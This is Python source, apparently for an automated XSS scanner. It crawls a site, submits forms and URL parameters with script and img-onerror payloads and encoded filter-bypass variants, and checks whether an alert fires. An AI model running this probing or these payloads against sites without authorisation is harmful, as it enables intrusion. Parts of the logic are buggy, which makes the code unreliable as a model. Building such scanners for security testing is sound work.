def identify_vuln_places(urls: dict, urls_and_values: dict):
    redirected_urls = []  # for this urls we should check: input that can cause XSS, where does the input I entered appears in the page

    for url in urls.keys():
        # print("the url checking: ", url)
        check_reflected_xss(url)
        """
        encoding_methods = ["ascii", "utf-8", "utf-16", "utf-32", "base64", "url"]
        #print("the url current checking: ", url)
        #print("the code of the website: ", response.text)
        all_params = parse_qs(urlparse(url).query)
        vuln_param = ""

        if len(urls[url]) > 1 or (len(urls[url]) == 1 and urls[url][0] != 'params in url'):
            values = urls_and_values[url]
        else:
            continue
        for param in all_params.keys():
            if all_params[param][0] in values.values():
                # so the input we inserted appears in the parameters
                vuln_param = param
        #print("all_params[param] = ", all_params[param], " values.values() = ", values.values())
        found_in_web = False
        urls_containing_val = {}
        for val in values.values():
            urls_containing_val[val] = []
            for url1 in urls.keys():
                res = requests.get(url1)
                escaped_val = re.escape(val)
                found_in_web = re.search(escaped_val, res.text)
                if found_in_web:
                    urls_containing_val[val].append(url1)
        if found_in_web or vuln_param != "":
            if vuln_param:
                print("we entered input and it appears in the parameter: ", vuln_param)

            for val in urls_containing_val.keys():
                if urls_containing_val[val]:
                    print(f"The value {val} appers in the pages: {urls_containing_val[val]}")
            print("the page: ", url, " is vulnerable, now we check if there is a known way to get alert")
            new_url, _ = check_stored_inputs(url, check_script=True, check_imgonerror=False)
            #print("new_url = ", new_url)
            alerted1 = test_alert(new_url)
            alerted2 = test_alert(url)
            if alerted1: # check the input <script>alert(1)</script>
                print("got xss in url: ", new_url)
                print("The input was in: ", url)
            elif alerted2:
                print("got xss in url: ", url)
            else: # check the input <img onerror=alert(1)>
                new_url, _ = check_stored_inputs(url, check_script=False, check_imgonerror=True)
                print("new_url = ", new_url)
                alerted = test_alert(new_url)
                if alerted:
                    print("got xss in url: ", new_url)

                else: # try the single encoding method
                    got_xss = False
                    for method in encoding_methods:
                        new_url = check_stored_inputs(url, encoding_method=method, check_script=True, check_imgonerror=False, single_encoding=True)
                        alerted = test_alert(new_url)
                        if alerted:
                            print("got xss in url: ", new_url)
                            got_xss = True
                            break

                    if not got_xss:
                        #try double encoding
                        for method in encoding_methods:
                            new_url = check_stored_inputs(url, encoding_method=method, check_script=True,
                                                          check_imgonerror=False, double_encoding=True)
                            alerted = test_alert(new_url)
                            if alerted:
                                print("got xss in url: ", new_url)
                                break

        if 'search' in urls[url]:
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            fields_to_fill = [['input', 'search', 0]]
            values = ['checking where it is asde2664']
            #button = soup.find_all('button')
            input_tags = soup.find_all('input')
            for tag in input_tags:
                if tag['name'] == "search":
                    button_tag = tag.find_next_sibling("button")
                    final_url = fill_form(url, fields_to_fill, values, button_tag, "GET")
                    print("found this URL: ", final_url)

            parsed_url = urlparse(url)
            host = parsed_url.netloc
            headers = {'Referer': url,
                       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
                       ,'Host': host}

            params = {'search': 'checking where it is asde2664'}
            response = requests.get(url, params=params, headers=headers)
            #print(response.headers.get('Set-Cookie'))
            #print(response.status_code)
            soup = BeautifulSoup(response.text, 'html.parser')
            search_string = 'checking where it is asde2664'
            elements = soup.find_all(string=lambda s: search_string in s)

            for element in elements:
                tag = element.find_parent()
                print("Found in tag:", tag.name)
                print("Full HTML element:\n", tag.prettify())
            if elements != None:
                #params = {'search': '<script>alert(1)</script>'}
                test_reflected(url)
                #response = requests.get(url, params=params, headers=headers)
                #print("response vuln = ", response.text)


        srcs = get_all_srcs(url)
        #if srcs is not None:
            #check_the_srcs(srcs, f"{urlparse(url).scheme}://{urlparse(url).netloc}")

        if 'params in url' in urls[url]:
            #print("results of attr: ")
            #print(search_for_attr(url))
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            #print(captured_value)
            base_url = urljoin(url, parsed_url.path)
            values = ['randomabc12344', '1234', '-18273', 'ownklnd']
            for param in params.keys():
                param_vuln = False
                for value in values:
                    params[param] = value

                    response1 = requests.get(base_url, params= params)
                    if response1.status_code == 200:
                        print("param: ", param)
                        print(response1.url)
                        response = requests.get(response1.url)
                        soup = BeautifulSoup(response.text, 'html.parser')
                        a_tag = soup.find_all('a')
                        #print(a_tag)
                        #for t in a_tag:
                            #print("the a tag = ", a_tag, " the href: ", t.get('href'), " and the url = ", response.url)

                        search_str = [value, f'{param}={value}']
                        #s = re.compile(value)
                        for val in search_str:
                            #tags_containing_value = soup.find_all(string=value)
                            for tag in soup.find_all(True):  # True finds all tags
                                # Check if the string is in any of the attributes
                                for attribute, value1 in tag.attrs.items():
                                    #print("attr = ", attribute, "value = ", value1)
                                    if val in value1:
                                        param_vuln = True
                                        print(f"Found in {tag.name} tag, {attribute} attribute: {val}")
                        #elements = soup.find_all(string=lambda s: search_string in s)

                        break
                if param_vuln:
                     print("param vuln")
            """
    # print(redirected_urls)


def check_stored_inputs(url, encoding_method="", check_script=False, check_imgonerror=False, double_encoding=False,
                        single_encoding=False):
    text = ''
    if check_script:
        text = '<script>alert(1)</script>'
    elif check_imgonerror:
        text = '<img src=1 onerror=alert(1)>'

    if encoding_method == "url":
        text = quote(text)
        if double_encoding:
            text = quote(text)

    elif double_encoding:  # need to double encode
        text = text.encode(encoding=encoding_method, errors="ignore")
        text = text.encode(encoding=encoding_method, errors="ignore")

    elif single_encoding:
        text = text.encode(encoding=encoding_method, errors="ignore")
    # print("url = ", url)

    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    form_tags = soup.find_all("form")
    for tag in form_tags:
        method = tag["method"]
        fields_to_fill = []
        values = []
        input_tags = tag.find_all("input")
        textarea_tags = tag.find_all("textarea")
        # print("form_tag: ")
        # print(input_tags)
        for input_tag in input_tags:
            list_to_append = []
            types_and_values = []

            list_to_append.append('input')
            list_to_append.append(input_tag['name'])
            if input_tag.has_attr('type'):
                if input_tag['type'] != "hidden":
                    list_to_append.append(
                        0)  # 0 = not hidden -> hidden means that the user can not input anything so its irelevant
                else:
                    list_to_append.append(1)  # 1 = hidden
            else:
                list_to_append.append(0)

            if not check_script and not check_imgonerror:
                text = check_type_render_input(input_tag)
            types_and_values.append(text)
            """
            if input_tag.has_attr('pattern'): # check if attr is required
                types_and_values.append('')
            elif input_tag.has_attr('type') and input_tag['type'] != "hidden":
                if input_tag['type'] == "text":
                    if text == '':
                        text = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8)) # generating a random text
                    types_and_values.append(text)
                elif input_tag['type'] == "email":
                    text1 = ''.join(
                        random.choices(string.ascii_uppercase + string.digits, k=8))  # generating a random text
                    types_and_values.append(text1 + '@gmail.com')
                else:
                    if text == '':
                        text = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8)) # generating a random text
                    types_and_values.append(text)
            elif not(input_tag.has_attr('type')):
                if text == '':
                    text = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))  # generating a random text
                types_and_values.append(text)

            elif input_tag.has_attr('type') and input_tag['type'] == "hidden":
                val = ""
                if input_tag.has_attr('value'):
                    val = input_tag['value']
                    #print("csrf/postid = ", val)
                types_and_values.append(val)
            """
            if list_to_append:
                fields_to_fill.append(list_to_append)
            if types_and_values:
                values.append(types_and_values[0])

        for textarea_tag in textarea_tags:
            list_to_append = []
            types_and_values = []
            if (not textarea_tag.has_attr('type')) or (
                    textarea_tag.has_attr('type') and textarea_tag['type'] != "hidden"):
                list_to_append.append('textarea')
                list_to_append.append(textarea_tag['name'])
            if textarea_tag.has_attr('type'):
                if textarea_tag['type'] != "hidden":
                    list_to_append.append(0)  # 0 = not hidden
                else:
                    list_to_append.append(1)  # 1 = hidden
            else:
                list_to_append.append(0)

            """
            #print("text is: ", text)
            if textarea_tag.has_attr('type') and textarea_tag['type'] != "hidden":
                if textarea_tag['type'] == "text":
                    if text == '':
                        text = ''.join(
                            random.choices(string.ascii_uppercase + string.digits, k=8))  # generating a random text
                    types_and_values.append(text)
                elif textarea_tag['type'] == "email":
                    text1 = ''.join(
                        random.choices(string.ascii_uppercase + string.digits, k=8))  # generating a random text
                    types_and_values.append(text1 + '@gmail.com')
            elif not (textarea_tag.has_attr('type')):
                if text == '':
                    text = ''.join(
                        random.choices(string.ascii_uppercase + string.digits, k=8))  # generating a random text
                types_and_values.append(text)
            """
            if not check_script and not check_imgonerror:
                text = check_type_render_input(textarea_tag)
            types_and_values.append(text)
            if list_to_append:
                fields_to_fill.append(list_to_append)
            if types_and_values:
                values.append(types_and_values[0])

        # print(values)
        # print("fields to fill: ")
        # print(fields_to_fill)

        button = tag.find('button')

        # result = run_submit_form(buttonSelector, url, fields_to_fill, values)
        # print("values = ", values)
        final_url = fill_form(url, fields_to_fill, values, button, method)
        # print("finalll = ", final_url)

        all_values = {}
        # print(fields_to_fill, types_and_value)
        for field, val in zip(fields_to_fill, values):
            all_values[field[1]] = val
        # print("url = ", url, " and the values I put are: ", all_values)
        return final_url, (url, all_values)

def get_links(base_url):
    # get all the pages which are statically from the web code
    all_links = [base_url]
    urls = [base_url] #change to a set
    for i, url in enumerate(urls):
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        for tag in soup.find_all('a',  href=True):
            #print("got a tag")
            link = tag['href']
            full_link = urljoin(base_url, link)
            #print("full_link: ", full_link)
            #print("urlparse(base_url).netloc = ", urlparse(base_url).netloc)
            #print("urlparse(full_link).netloc = ", urlparse(full_link).netloc)
            if full_link not in all_links and urlparse(base_url).netloc == urlparse(full_link).netloc:
                params = parse_qs(urlparse(full_link).query)
                #print("parmas: ", params.keys())
                to_add = True
                for link in all_links: #not putting in pages which only differ in the value of the params
                    parsed_url = urlparse(link)
                    captured_value = parse_qs(parsed_url.query)
                    #print("captured_value: ", captured_value.keys())
                    #print("urlparse(full_link).netloc: ", urlparse(full_link).netloc, " urlparse(link).netloc: ", urlparse(link).netloc)
                    parsed_link = urlparse(full_link)
                    if captured_value.keys() == params.keys() and urljoin(full_link, parsed_link.path) == urljoin(link ,parsed_url.path):
                        to_add = False
                if to_add:
                    all_links.append(full_link)
        urls.__delitem__(i)
    #print("got all pages statically")

    urls_and_values = {} # a dictionary that contains for each url where did I put input
    # get the pages the web redirects to using input from user (uses playwright library)
    for url in all_links:
        parsed_url = urlparse(url)
        headers = {'Referer': url,
                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                    'Host': parsed_url.netloc}
        session = requests.Session()
        response = session.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        input_pages = soup.find_all('input')
        if input_pages:
            # we want to mimic a POST request to check if there are any other pages
            """
            try:
                csrf_token = soup.find('input', {'name': 'csrf'})['value']
                #print("2")

                origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
                headers = {'Referer': url,
                           'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                           'Origin': origin,
                           'Content - Type': 'application / x - www - form - urlencoded'}

                action_token = soup.find('form', {'method':'POST'})['action']

                post_url = urljoin(origin, action_token)

                post_id = parse_qs(parsed_url.query)['postId'][0]

                data = {'csrf': csrf_token, 'postId': post_id, 'comment': 'fake',
                        'name': 'fake name', 'email': 'e2d0@gmail.com', 'website': ''}
                #for cookie in cookies:
                #    session.cookies.set(cookie['name'], cookie['value'])

                post_response = session.post(post_url, data=data, headers=headers, allow_redirects=False)
                #print("post response: ")
                #print(post_response.content)
                #print(post_response.status_code)

                if post_response.status_code == 302:
                    location = post_response.headers.get('Location')
                    #print("location = ", location)
                    full_link = urljoin(origin, location)
                    #print("the link it got from response: ", full_link)
                    if full_link not in all_links and urlparse(base_url).netloc == urlparse(full_link).netloc:
                        params = parse_qs(urlparse(full_link).query)
                        to_add = True
                        for link in all_links:  # not putting in pages which only differ in the value of the params
                            parsed_url = urlparse(link)
                            captured_value = parse_qs(parsed_url.query)
                            parsed_link = urlparse(full_link)
                            #print("urlparse(full_link).netloc == urlparse(link).netloc => ", urljoin(full_link, parsed_link.path),
                            #      " ", urljoin(link ,parsed_url.path))
                            if captured_value.keys() == params.keys() and urljoin(full_link, parsed_link.path) == urljoin(link ,parsed_url.path):
                                to_add = False
                        if to_add:
                            all_links.append(full_link)

            except:
                print("could not post a comment")
                """
            another_url, (url1, values) = check_stored_inputs(url)
            #print("url = ", url, " and the values I put are: ", values)
            urls_and_values[url1] = values
            new_url = get_url_without_params(another_url)
            if new_url not in all_links_without_params(all_links):
                #print("stripped = ", new_url, " url = ", another_url)
                all_links.append(another_url)

    return all_links, urls_and_values